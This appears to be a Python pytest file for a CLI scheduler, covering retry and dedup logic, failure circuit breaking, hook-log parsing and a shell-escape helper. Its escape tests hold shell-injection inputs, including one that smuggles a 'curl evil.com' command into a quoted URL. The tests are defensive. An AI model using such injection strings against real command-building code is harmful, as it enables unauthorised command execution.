"""Tests for scheduler — retry logic and log handling."""

import json
from datetime import datetime, timedelta, timezone

import pytest

from cli.scheduler import (
    check_retry,
    consecutive_schedule_failures,
    last_confirmed_entry,
    log_entry,
    DEDUP_WINDOW_SECONDS,
    MAX_COMMAND_RETRIES,
    MAX_SCHEDULE_FAILURES,
)


def _old_timestamp() -> str:
    """Return an ISO timestamp well outside the dedup window."""
    return (datetime.now(timezone.utc) - timedelta(seconds=DEDUP_WINDOW_SECONDS + 60)).isoformat()


def _recent_timestamp() -> str:
    """Return an ISO timestamp within the dedup window."""
    return (datetime.now(timezone.utc) - timedelta(seconds=5)).isoformat()


class TestRetryLogic:

    def test_first_run_returns_attempt_1(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        proceed, attempt = check_retry("time_split", "initiative", hook_log)
        assert proceed is True
        assert attempt == 1

    def test_different_command_resets(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        hook_log.write_text(json.dumps({
            "command": "time_split", "context_key": "initiative",
            "status": "confirmed", "attempt": 1, "timestamp": _recent_timestamp(),
        }) + "\n")
        proceed, attempt = check_retry("deepen_time_split", "initiative", hook_log)
        assert proceed is True
        assert attempt == 1

    def test_same_command_increments_attempt(self, tmp_path):
        """Genuine retry (outside dedup window) increments the attempt counter."""
        hook_log = tmp_path / "hook_log.jsonl"
        hook_log.write_text(json.dumps({
            "command": "time_split", "context_key": "initiative",
            "status": "confirmed", "attempt": 1, "timestamp": _old_timestamp(),
        }) + "\n")
        proceed, attempt = check_retry("time_split", "initiative", hook_log)
        assert proceed is True
        assert attempt == 2

    def test_same_command_within_dedup_window_rejects(self, tmp_path):
        """Rapid duplicate (within dedup window) is rejected."""
        hook_log = tmp_path / "hook_log.jsonl"
        hook_log.write_text(json.dumps({
            "command": "time_split", "context_key": "initiative",
            "status": "confirmed", "attempt": 1, "timestamp": _recent_timestamp(),
        }) + "\n")
        proceed, attempt = check_retry("time_split", "initiative", hook_log)
        assert proceed is False
        assert attempt == 1

    def test_same_command_outside_dedup_window_allows(self, tmp_path):
        """Same command outside the dedup window is treated as a genuine retry."""
        hook_log = tmp_path / "hook_log.jsonl"
        hook_log.write_text(json.dumps({
            "command": "bootstrap", "context_key": "phase:P1",
            "status": "confirmed", "attempt": 1, "timestamp": _old_timestamp(),
        }) + "\n")
        proceed, attempt = check_retry("bootstrap", "phase:P1", hook_log)
        assert proceed is True
        assert attempt == 2

    def test_max_retries_stops(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        hook_log.write_text(json.dumps({
            "command": "bootstrap", "context_key": "phase:P1",
            "status": "confirmed", "attempt": MAX_COMMAND_RETRIES,
            "timestamp": _old_timestamp(),
        }) + "\n")
        proceed, attempt = check_retry("bootstrap", "phase:P1", hook_log)
        assert proceed is False

    def test_dedup_logs_skipped_entry(self, tmp_path):
        """Deduplication should log a 'deduplicated' entry."""
        hook_log = tmp_path / "hook_log.jsonl"
        hook_log.write_text(json.dumps({
            "command": "time_split", "context_key": "initiative",
            "status": "confirmed", "attempt": 1, "timestamp": _recent_timestamp(),
        }) + "\n")
        check_retry("time_split", "initiative", hook_log)
        lines = hook_log.read_text().strip().split("\n")
        last = json.loads(lines[-1])
        assert last["action"] == "deduplicated"
        assert last["status"] == "skipped"

    def test_unparseable_timestamp_falls_through_to_retry(self, tmp_path):
        """If timestamp can't be parsed, fall through to retry logic."""
        hook_log = tmp_path / "hook_log.jsonl"
        hook_log.write_text(json.dumps({
            "command": "time_split", "context_key": "initiative",
            "status": "confirmed", "attempt": 1, "timestamp": "not-a-date",
        }) + "\n")
        proceed, attempt = check_retry("time_split", "initiative", hook_log)
        assert proceed is True
        assert attempt == 2


class TestLastConfirmedEntry:

    def test_noop_log_not_matched(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        hook_log.write_text(json.dumps({
            "action": "noop", "command": None, "status": "noop", "timestamp": "t1",
        }) + "\n")
        assert last_confirmed_entry(hook_log) is None

    def test_confirmed_with_command(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        lines = [
            json.dumps({"command": "time_split", "context_key": "initiative",
                        "status": "confirmed", "attempt": 1, "timestamp": "t1"}),
            json.dumps({"action": "noop", "command": None, "status": "noop",
                        "timestamp": "t2"}),
        ]
        hook_log.write_text("\n".join(lines) + "\n")
        entry = last_confirmed_entry(hook_log)
        assert entry is not None
        assert entry["command"] == "time_split"

    def test_confirmed_without_command_field_skipped(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        hook_log.write_text(json.dumps({
            "status": "confirmed", "timestamp": "t1",
        }) + "\n")
        assert last_confirmed_entry(hook_log) is None

    def test_nonexistent_file(self, tmp_path):
        hook_log = tmp_path / "nonexistent.jsonl"
        assert last_confirmed_entry(hook_log) is None


class TestConsecutiveScheduleFailures:

    def test_no_log_returns_zero(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        assert consecutive_schedule_failures("bootstrap", "phase:P1", hook_log) == 0

    def test_counts_consecutive_failures(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        lines = [
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "confirmed", "attempt": 1, "timestamp": "t1"}),
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t2"}),
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t3"}),
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t4"}),
        ]
        hook_log.write_text("\n".join(lines) + "\n")
        assert consecutive_schedule_failures("bootstrap", "phase:P1", hook_log) == 3

    def test_resets_on_confirmed(self, tmp_path):
        """A confirmed entry breaks the consecutive failure streak."""
        hook_log = tmp_path / "hook_log.jsonl"
        lines = [
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t1"}),
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "confirmed", "attempt": 1, "timestamp": "t2"}),
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t3"}),
        ]
        hook_log.write_text("\n".join(lines) + "\n")
        assert consecutive_schedule_failures("bootstrap", "phase:P1", hook_log) == 1

    def test_ignores_other_commands(self, tmp_path):
        """Failures for a different command are skipped, not counted or breaking."""
        hook_log = tmp_path / "hook_log.jsonl"
        lines = [
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t1"}),
            json.dumps({"command": "time_split", "context_key": "initiative",
                        "status": "failed", "timestamp": "t2"}),
        ]
        hook_log.write_text("\n".join(lines) + "\n")
        # bootstrap has 1 consecutive failure (the time_split entry is irrelevant)
        assert consecutive_schedule_failures("bootstrap", "phase:P1", hook_log) == 1
        assert consecutive_schedule_failures("time_split", "initiative", hook_log) == 1

    def test_stalled_entries_count_toward_failures(self, tmp_path):
        """Stalled entries don't reset the counter — prevents infinite cycle."""
        hook_log = tmp_path / "hook_log.jsonl"
        lines = [
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t1"}),
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t2"}),
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "stalled", "timestamp": "t3"}),
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t4"}),
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": "t5"}),
        ]
        hook_log.write_text("\n".join(lines) + "\n")
        assert consecutive_schedule_failures("bootstrap", "phase:P1", hook_log) == 5

    def test_schedule_failure_circuit_breaker(self, tmp_path):
        """After MAX_SCHEDULE_FAILURES consecutive failures, check_retry stalls."""
        hook_log = tmp_path / "hook_log.jsonl"
        lines = [
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": f"t{i}"})
            for i in range(MAX_SCHEDULE_FAILURES)
        ]
        hook_log.write_text("\n".join(lines) + "\n")
        proceed, _ = check_retry("bootstrap", "phase:P1", hook_log)
        assert proceed is False
        # Verify stall was logged
        last_line = hook_log.read_text().strip().split("\n")[-1]
        entry = json.loads(last_line)
        assert entry["status"] == "stalled"
        assert "scheduling failed" in entry["reason"]

    def test_schedule_failures_below_threshold_proceed(self, tmp_path):
        """Below MAX_SCHEDULE_FAILURES, check_retry still proceeds."""
        hook_log = tmp_path / "hook_log.jsonl"
        lines = [
            json.dumps({"command": "bootstrap", "context_key": "phase:P1",
                        "status": "failed", "timestamp": f"t{i}"})
            for i in range(MAX_SCHEDULE_FAILURES - 1)
        ]
        hook_log.write_text("\n".join(lines) + "\n")
        proceed, attempt = check_retry("bootstrap", "phase:P1", hook_log)
        assert proceed is True
        assert attempt == 1


class TestShellEscape:

    def test_escapes_double_quotes(self):
        from cli.subcommands import _shell_escape
        assert _shell_escape('hello"world') == 'hello\\"world'

    def test_escapes_dollar_sign(self):
        from cli.subcommands import _shell_escape
        assert _shell_escape("$(evil)") == "\\$(evil)"

    def test_escapes_backticks(self):
        from cli.subcommands import _shell_escape
        assert _shell_escape("`evil`") == "\\`evil\\`"

    def test_escapes_backslashes(self):
        from cli.subcommands import _shell_escape
        assert _shell_escape("a\\b") == "a\\\\b"

    def test_combined_injection_attempt(self):
        from cli.subcommands import _shell_escape
        malicious = 'http://host"; curl evil.com #'
        escaped = _shell_escape(malicious)
        assert '"' not in escaped.replace('\\"', '')
        assert escaped == 'http://host\\"; curl evil.com #'


class TestLogEntry:

    def test_appends_with_timestamp(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        log_entry(hook_log, {"action": "test", "command": "foo"})
        lines = hook_log.read_text().strip().split("\n")
        assert len(lines) == 1
        entry = json.loads(lines[0])
        assert entry["action"] == "test"
        assert "timestamp" in entry

    def test_appends_multiple(self, tmp_path):
        hook_log = tmp_path / "hook_log.jsonl"
        log_entry(hook_log, {"action": "first"})
        log_entry(hook_log, {"action": "second"})
        lines = hook_log.read_text().strip().split("\n")
        assert len(lines) == 2
